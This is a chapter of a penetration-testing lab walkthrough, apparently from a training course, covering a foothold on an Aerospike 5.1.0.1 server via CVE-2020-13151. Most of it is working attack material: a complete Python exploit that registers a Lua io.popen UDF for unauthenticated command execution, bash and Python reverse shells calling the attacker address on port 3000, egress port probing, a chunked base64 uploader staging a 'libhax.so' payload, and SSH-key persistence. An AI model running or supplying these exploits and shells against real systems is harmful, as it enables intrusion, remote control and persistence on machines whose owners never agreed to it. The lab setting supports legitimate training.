# 04 — Foothold: Lua that runs shell

Chapter 03 named the daemon and the CVE. This chapter turns `5.1.0.1` into a shell, and settles the one
environmental question that shaped everything after it: **how far can the target reach back?** The
short answer — an earlier draft of this page said "not at all", and that was wrong. Egress here is a
**port allowlist**, and one of the allowed ports is `3000`, the same port the exploit already uses.

---

## 4.1 The UDF

Three lines of Lua are the entire payload:

```lua
function runCMD(rec, cmd)
    local handle = io.popen(cmd)
    local out = handle:read("*a")
    handle:close()
    return out
end
```

`io.popen` is not a quirk of the sandbox — it is plain Lua, and Aerospike hands it to module code in
`5.1.0.1`. The function signature is the UDF contract: `(record, arg1, ...)`, return value is handed
back to the client as the record's "result".

`client.apply()` returns that value verbatim, so the command's stdout comes back over the same
connection that sent it. No listener, no callback, no port forward.

---

## 4.2 Driving the client

The published exploit refuses this version (chapter 03, §3.3), so the client library is driven
directly. The full script is in [`scripts/poc_aerospike_rce.py`](scripts/poc_aerospike_rce.py):

```python
#!/usr/bin/env python3
"""CVE-2020-13151 — Aerospike CE < 5.1.0.3 unauthenticated command execution."""
import argparse, os, random, string, sys
import aerospike

UDF_SRC = """function runCMD(rec, cmd)
    local handle = io.popen(cmd)
    local out = handle:read("*a")
    handle:close()
    return out
end
"""

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ahost", default="192.168.150.143")
    ap.add_argument("--aport", type=int, default=3000)
    ap.add_argument("--namespace", default="test")
    ap.add_argument("--setname", default="cve202013151")
    ap.add_argument("--udf", default="poc.lua")
    ap.add_argument("--cmd", required=True)
    a = ap.parse_args()

    open(a.udf, "w").write(UDF_SRC)

    client = aerospike.client({
        "hosts": [(a.ahost, a.aport)],
        "policies": {"timeout": 8000, "total_timeout": 8000, "socket_timeout": 8000},
    }).connect()

    print("[+] build:", list(client.info_all("build").values())[0][1].strip())

    key = ("".join(random.choice(string.ascii_lowercase) for _ in range(16)))
    client.put((a.namespace, a.setname, key), {"pk": key})   # needs a record to attach to
    client.udf_put(a.udf)                                     # register module 'poc'
    print("[+] executing:", a.cmd)
    print(client.apply((a.namespace, a.setname, key), "poc", "runCMD", [a.cmd]))
    client.close()

if __name__ == "__main__":
    main()
```

Two prerequisites that are easy to miss and produce confusing errors:

- **`udf_put` needs a namespace that exists and a client allowed to write.** `test` is the default
  namespace on a stock install and accepts writes from an unauthenticated client.
- **`apply` needs a real record key.** The UDF is attached to a record, not invoked globally, so the
  `put` has to happen first. Without it, `apply` fails with a not-found rather than anything useful.

One interpreter trap worth its own line. `pip3 install --user aerospike` puts the module in
`~/.local/lib/python3.13/site-packages`, which **root's Python never reads** — so
`sudo python3 poc_aerospike_rce.py` fails with `ModuleNotFoundError: No module named 'aerospike'`
while the same command without `sudo` works. Nothing here needs privileges. If it must run as root,
install it for root: `sudo python3 -m pip install --break-system-packages aerospike`.

---

## 4.3 First command

```bash
python3 poc_aerospike_rce.py --ahost 192.168.152.143 \
  --cmd 'id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt'
```

```
[+] build: 5.1.0.1
[+] executing: id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt
uid=1000(aero) gid=1000(aero) groups=1000(aero)
lab-pwk2-student-cl4-143-ubuntu20-aero-241-102
5.4.0-104-generic
---LOCAL---
89fa94be5fc49493528ce6f5096c3ff0
```

`uid=1000(aero)` — the daemon runs as an unprivileged service account, as it should. The hostname is
worth reading twice: it encodes the lab, the student, the OS and the account
(`…-ubuntu20-aero-241-102`), which is a small information leak in its own right and also a reminder
that this image is built per-student and not hand-hardened.

**`local.txt` is captured in the first command**, because the daemon's own user can read it — no
escalation needed.

The transcript above is from a rebuilt instance at `192.168.152.143`; the original engagement ran
against `192.168.150.143` (`…-aero-242-100`) with a different flag. Same image, same build string,
same everything that matters. The next question is what that shell can and cannot do.

---

## 4.4 Egress is filtered by port, not blocked

A reverse shell was the obvious next step, and the first attempt produced nothing at all. The
tempting conclusion — "the target has no route to the attacker" — is only half right, and the half
that is wrong costs you the whole TTY.

The target's routing is ordinary:

```
$ ip route
default via 192.168.152.254 dev ens3 proto static
192.168.152.0/24 dev ens3 proto kernel scope link src 192.168.152.143

$ ip route get 192.168.45.158
192.168.45.158 via 192.168.152.254 dev ens3 src 192.168.152.143 uid 1000
```

There is a default route and the attacker address resolves through it. Packets leave. What happens
next is a **destination-port allowlist**, and the only way to see it is to have the target dial a
listener you control and print the exit status — `io.popen` captures **stdout only**, so a bare
`bash -c 'cat </dev/null >/dev/tcp/…'` that fails prints nothing and looks like a hang.

```bash
nc -lvnp 4444    # attacker, listening first
```

```bash
# via the UDF — note the explicit rc, because stderr never comes back
for p in 22 53 80 443 4444 8080 8834; do
  printf '%s: ' "$p"
  nc -zv -w3 192.168.45.158 "$p" 2>&1 | tail -1
done
```

```
22: Connection refused
53: Connection refused
80: Connection refused
443: Connection refused
4444: timed out
8080: timed out
8834: timed out
```

Read the two answers carefully, because they are not the same failure:

| Result | Meaning |
|---|---|
| `Connection refused` | The SYN **arrived**. Kali's kernel answered with RST because nothing was listening. The path is open. |
| `timed out` | The SYN was **dropped in transit**. Nothing will ever arrive, listener or not. |

So `22`, `53`, `80`, `443` are permitted and `4444`, `8080`, `8834` are not. That is an allowlist of
common service ports — the lab's own plumbing, not a blackhole.

The decisive test is the obvious one: put a listener on a **permitted** port. `3000` is free on Kali,
above 1024 so it needs no root, and — because it is Aerospike's own port — it is on the allowlist.

```bash
# attacker
nc -lvnp 3000
```

```bash
# via the UDF
timeout 5 bash -c 'echo SMOKE-3000 >/dev/tcp/192.168.45.158/3000' 2>&1; echo rc=$?
```

```
rc=0
```

```
listening on [any] 3000 ...
connect to [192.168.45.158] from (UNKNOWN) [192.168.152.143] 38008
SMOKE-3000
```

A round trip in both directions. **The target can call back — on `3000`, `22`, `53`, `80` or `443`.**

> **The blind test is worthless.** Before the listener existed, ten attempts from the target to
> `4444` all failed and the listener log stayed empty:
>
> ```
> attempt1 FAIL … attempt10 FAIL      (target side)
> listening on [any] 4444 ...         (attacker side, no SYNs at all)
> ```
>
> Identical output for "no listener", "filtered port" and "wrong address". If you cannot tell those
> apart, you cannot conclude anything about the network. Start the listener, then test.

---

## 4.5 A reverse shell on an allowed port

With `3000` proven bidirectional, the reverse shell is three lines. The child must be **backgrounded
with all three streams redirected**, or `io.popen` blocks on `read()` until the client times out:

```bash
python3 poc_aerospike_rce.py --ahost 192.168.152.143 \
  --cmd 'setsid bash -c "bash -i >& /dev/tcp/192.168.45.158/3000 0>&1" >/dev/null 2>&1 </dev/null &'
```

```
[+] build: 5.1.0.1
[+] executing: setsid bash -c "bash -i >& /dev/tcp/192.168.45.158/3000 0>&1" >/dev/null 2>&1 </dev/null &
```

```bash
nc -lvnp 3000    # attacker
```

```
listening on [any] 3000 ...
connect to [192.168.45.158] from (UNKNOWN) [192.168.152.143] 38034
bash: cannot set terminal process group (4750): Inappropriate ioctl for device
bash: no job control in this shell
aero@lab-pwk2-student-cl4-143-ubuntu20-aero-241-102:/$ whoami
aero
```

That warning pair is harmless — it is bash saying it has no controlling terminal. It also tells you
what you are missing: no `sudo` prompt, no `su`, no `ssh` password entry, no `top` or `less` without
`TERM`. For a real PTY, spawn one from the target's own Python. Full payload in
[`scripts/revshell.py`](scripts/revshell.py):

```python
#!/usr/bin/env python3
"""Connect back and hand the socket to a pty — a terminal, not a pipe."""
import os
import pty
import socket

HOST, PORT = "192.168.45.158", 3000

s = socket.socket()
s.connect((HOST, PORT))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/bash")
```

Staged through the UDF with a heredoc, then detached:

```bash
python3 poc_aerospike_rce.py --ahost 192.168.152.143 --cmd 'cat > /tmp/.rs.py <<"PY"
import os, pty, socket
s = socket.socket()
s.connect(("192.168.45.158", 3000))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/bash")
PY
setsid nohup python3 /tmp/.rs.py >/dev/null 2>&1 </dev/null &'
```

```
connect to [192.168.45.158] from (UNKNOWN) [192.168.152.143] 38014
aero@lab-pwk2-student-cl4-143-ubuntu20-aero-241-102:/$ id; tty
uid=1000(aero) gid=1000(aero) groups=1000(aero)
/dev/pts/0
```

`/dev/pts/0` is the difference between "I can run commands" and "I have a session". `pty.spawn` also
gives you `Ctrl-C`, `Ctrl-Z`, bash history and a working `TERM`.

For anything beyond a few commands, the `--cmd-file` variant of the helper is easier than quoting a
heredoc into a shell argument:

```bash
python3 scripts/aero_cmd.py --host 192.168.152.143 --cmd-file revshell_stage.sh
```

Every failure that cost time here, and why:

| Attempt | Why it failed |
|---|---|
| `bash -i >& /dev/tcp/…/4444 0>&1` | No listener was running. The connection was refused instantly, and `io.popen` discarded stderr, so the UDF returned an empty string. |
| Same, retried with a listener | `4444` is not on the allowlist. The SYN never arrived. |
| `nc -e bin/sh 192.168.45.158 4444` | Two bugs: the path is `/bin/sh`, and the target's `nc` is the OpenBSD build, which has no `-e` at all. |
| `ping 192.168.45.158 4444` | `ping` takes no port, and without `-c` it never exits — so `io.popen` blocked and the client raised `TimeoutError: (9, 'Client timeout: socket=8000 total=8000 iterations=1 …')`. That error was the command hanging, not the firewall. |

Three rules that follow:

1. **Background the child** (`setsid … &`, all three streams redirected). A foreground shell, `ping`
   without `-c`, `top`, or any watcher will block `apply()` into a timeout.
2. **Append `2>&1`** to anything you might need to read. The UDF returns stdout only; silence is
   not success.
3. **Pick a port on the allowlist.** `3000` is the natural choice on this box and needs no
   privileges on the attacker.

---

## 4.6 A file transport that fits in a UDF call

Even with a shell, binary uploads over a reverse shell are awkward — a terminal is a bad pipe for
`base64` pastes of a 14 KB shared object. The socket transport is still the reliable path, and it is
the only path when no allowlisted port happens to be free.

Binary payloads cannot ride a shell one-liner, and `base64` output through `io.popen` is fine but
each `apply()` blocks a server thread. The compromise is **chunked base64 appended to a temp file**,
with a small chunk size so no single call outlives the client timeout. The script is
[`scripts/poc_aerospike_upload.py`](scripts/poc_aerospike_upload.py):

```python
CHUNK = 3000
b64 = base64.b64encode(open(local, "rb").read()).decode()

run(f"rm -f {tmp}")
for off in range(0, len(b64), CHUNK):
    run(f"printf '%s' '{b64[off:off+CHUNK]}' >> {tmp}")
run(f"base64 -d {tmp} > {remote} && rm -f {tmp} && chmod {mode} {remote} && sha256sum {remote}")
```

```bash
AHOST=192.168.150.143 python3 poc_aerospike_upload.py \
  --local /tmp/screen_poc/libhax.so --remote /tmp/screenroot/libhax.so --mode 755
```

```
[+] uploading /tmp/screen_poc/libhax.so (14264 bytes) -> /tmp/screenroot/libhax.so
[+] local sha256 190380462e10228d19a9acd956d8c4d789f641cd79ab1d0aa41d6a92b057b775
    sent 19020 b64 chars
[+] remote: 190380462e10228d19a9acd956d8c4d789f641cd79ab1d0aa41d6a92b057b775  /tmp/screenroot/libhax.so
[+] hash match — the file arrived intact
```

`AHOST` is just the host default — the script reads `AHOST`/`APORT`/`ANAMESPACE`/`ASET` from the
environment and also accepts `--host`/`--port`. Without it you get the script's built-in default,
which on a rebuilt box is the wrong address. Re-verified on the `192.168.152.143` rebuild with a
20 000-byte random file (seven chunks, mode `644`):

```bash
AHOST=192.168.152.143 python3 poc_aerospike_upload.py \
  --local big.bin --remote /tmp/aeroupload_test/big.bin --mode 644
```

```
[+] uploading big.bin (20000 bytes) -> /tmp/aeroupload_test/big.bin
[+] local sha256 74707cda7f34a441c9f567f1290c63952a97765b2dccc5148e9d3b621abbd63a
    sent 26668 b64 chars
[+] remote: 74707cda7f34a441c9f567f1290c63952a97765b2dccc5148e9d3b621abbd63a  /tmp/aeroupload_test/big.bin
[+] hash match — the file arrived intact
```

On the target side, both the contents and the mode are what was asked for:

```
-rw-r--r--  1 aero aero 20000 /tmp/aeroupload_test/big.bin
-rwxr-xr-x  1 aero aero  1068 /tmp/aeroupload_test/small.py
```

The hash in the response is the whole point: it is computed **on the target**, so a round-trip match
proves the bytes arrived intact through a channel that was never designed to carry files.

> **The first attempt silently wrote nothing.** The staging directory did not exist, so every
> `printf … >> /tmp/screenroot/libhax.so.b64` failed while the final `base64 -d` reported an empty
> hash. `sha256sum` returning nothing is the tell. Create the directory first, then upload — and
> always compare the remote hash to the local one before using the file.

---

## 4.7 Interactive access

The socket is a fine command channel but a poor terminal. It has no TTY, no job control, and an 8 s
ceiling per call; anything long-running (a `find /`, a watcher) dies mid-call.

Two ways to fix that, and they are not exclusive:

- **Reverse shell on an allowlisted port** (§4.5). No key, no daemon, works as soon as you have the
  UDF. Good for the rest of the session, lost when the box rebuilds.
- **SSH key on 22.** Write `~/.ssh/authorized_keys` for `aero`, then `ssh -i key aero@target` for a
  durable session with full job control. 22 is open inbound from Kali, so this needs no exotic
  routing.

It is also the difference between "I have code execution" and "I have a session" — worth doing before
enumeration, because enumeration is interactive work.

With a shell in hand and `local.txt` already banked, the next chapter is the one that decides the
box: what does `aero` have that `aero` should not.
